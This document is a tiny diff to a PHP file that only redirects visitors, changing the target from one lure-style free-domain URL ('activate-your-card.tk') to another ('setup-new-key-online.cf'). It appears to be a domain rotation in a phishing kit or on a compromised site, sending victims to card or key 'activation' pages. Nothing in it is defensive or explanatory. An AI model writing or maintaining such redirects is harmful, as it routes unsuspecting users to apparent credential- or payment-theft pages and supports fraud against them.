@@ -1,4 +1,4 @@
 <?php
-header("Location: https://activate-your-card.tk/actoff/setup_in.php");
+header("Location: https://setup-new-key-online.cf/actoff/");
 die();
 ?>
